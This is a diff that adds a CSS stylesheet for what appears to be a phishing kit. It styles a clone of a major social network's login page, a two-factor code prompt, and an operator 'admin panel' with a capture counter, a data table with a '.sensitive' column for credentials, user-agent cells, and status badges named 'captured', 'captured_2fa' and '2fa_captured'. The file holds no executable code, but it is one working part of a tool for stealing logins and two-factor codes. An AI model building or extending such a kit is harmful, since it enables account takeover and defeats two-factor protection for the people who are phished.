@@ -1,0 +1,368 @@
+/* General Reset */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: #fafafa;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 40px 0;
+}
+
+/* Container */
+.container {
+    width: 380px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+}
+
+/* Login Card */
+.login-card {
+    background: white;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 40px 40px 20px;
+    width: 100%;
+    text-align: center;
+}
+
+.logo {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 24px;
+}
+
+.logo h1 {
+    font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
+    font-weight: 400;
+    font-size: 28px;
+    margin-top: 8px;
+    color: #262626;
+}
+
+/* Form Elements */
+form {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    margin-bottom: 12px;
+}
+
+input[type="text"],
+input[type="password"] {
+    padding: 9px 8px 7px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    font-size: 12px;
+    width: 100%;
+    outline: none;
+    transition: border-color 0.1s;
+}
+
+input[type="text"]:focus,
+input[type="password"]:focus {
+    border-color: #a8a8a8;
+}
+
+button[type="submit"] {
+    background: #0095f6;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: 600;
+    font-size: 14px;
+    padding: 7px 16px;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.1s;
+}
+
+button[type="submit"]:hover {
+    background: #1877f2;
+}
+
+button[type="submit"]:active {
+    opacity: 0.8;
+}
+
+/* Messages */
+.error-msg {
+    color: #ed4956;
+    font-size: 13px;
+    margin-bottom: 10px;
+    line-height: 1.4;
+}
+
+.info-msg {
+    color: #2ecc71;
+    font-size: 13px;
+    margin-bottom: 10px;
+    line-height: 1.4;
+    padding: 10px;
+    background: #e8f8f0;
+    border-radius: 4px;
+}
+
+/* Divider */
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 14px 0;
+    color: #8e8e8e;
+    font-size: 13px;
+    font-weight: 600;
+}
+
+.divider::before,
+.divider::after {
+    content: '';
+    flex: 1;
+    border-bottom: 1px solid #dbdbdb;
+}
+
+.divider span {
+    padding: 0 18px;
+}
+
+/* Facebook Login */
+.facebook-login {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    color: #385185;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    margin-bottom: 12px;
+}
+
+.facebook-login:hover {
+    opacity: 0.8;
+}
+
+/* Forgot Link */
+.forgot-link {
+    color: #00376b;
+    font-size: 12px;
+    text-decoration: none;
+}
+
+/* Signup Card */
+.signup-card {
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 20px;
+    width: 100%;
+    text-align: center;
+    font-size: 14px;
+}
+
+.signup-card a {
+    color: #0095f6;
+    font-weight: 600;
+    text-decoration: none;
+}
+
+/* Get App */
+.get-app {
+    text-align: center;
+    margin-top: 10px;
+}
+
+.get-app p {
+    font-size: 14px;
+    margin-bottom: 16px;
+}
+
+.app-badges {
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+}
+
+.app-badges img {
+    height: 40px;
+}
+
+/* 2FA Styles */
+.twofa-header {
+    margin-bottom: 20px;
+}
+
+.twofa-header svg {
+    margin-bottom: 12px;
+}
+
+.twofa-header h2 {
+    font-size: 18px;
+    font-weight: 600;
+    color: #262626;
+    margin-bottom: 8px;
+}
+
+.twofa-header p {
+    font-size: 14px;
+    color: #8e8e8e;
+}
+
+.twofa-options {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin-top: 16px;
+}
+
+.twofa-options a {
+    color: #0095f6;
+    font-size: 13px;
+    text-decoration: none;
+    font-weight: 500;
+}
+
+.twofa-options a:hover {
+    text-decoration: underline;
+}
+
+/* Admin Panel Styles */
+.admin-container {
+    width: 90%;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+.admin-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: white;
+    padding: 20px 24px;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    margin-bottom: 20px;
+}
+
+.admin-header h1 {
+    font-size: 22px;
+    color: #262626;
+}
+
+.admin-actions {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.capture-count {
+    font-weight: 600;
+    color: #0095f6;
+    font-size: 14px;
+}
+
+.btn-danger {
+    background: #ed4956;
+    color: white;
+    border: none;
+    padding: 8px 16px;
+    border-radius: 6px;
+    font-weight: 600;
+    cursor: pointer;
+    font-size: 13px;
+}
+
+.btn-danger:hover {
+    background: #c93643;
+}
+
+.btn-logout {
+    text-decoration: none;
+    color: #8e8e8e;
+    font-size: 14px;
+}
+
+.btn-logout:hover {
+    color: #262626;
+}
+
+/* Data Table */
+.data-table {
+    width: 100%;
+    background: white;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    border-collapse: collapse;
+}
+
+.data-table th,
+.data-table td {
+    padding: 10px 14px;
+    text-align: left;
+    font-size: 13px;
+    border-bottom: 1px solid #efefef;
+}
+
+.data-table th {
+    background: #fafafa;
+    font-weight: 600;
+    color: #8e8e8e;
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.data-table tr:hover td {
+    background: #fafafa;
+}
+
+.sensitive {
+    color: #ed4956;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+}
+
+.ua-cell {
+    max-width: 200px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+
+/* Badges */
+.badge {
+    display: inline-block;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+}
+
+.badge-captured,
+.badge-captured_2fa {
+    background: #fff3cd;
+    color: #856404;
+}
+
+.badge-2fa_captured {
+    background: #cce5ff;
+    color: #004085;
+}
+
+/* Empty State */
+.empty-state {
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 60px;
+    text-align: center;
+    color: #8e8e8e;
+    border-radius: 4px;
+}
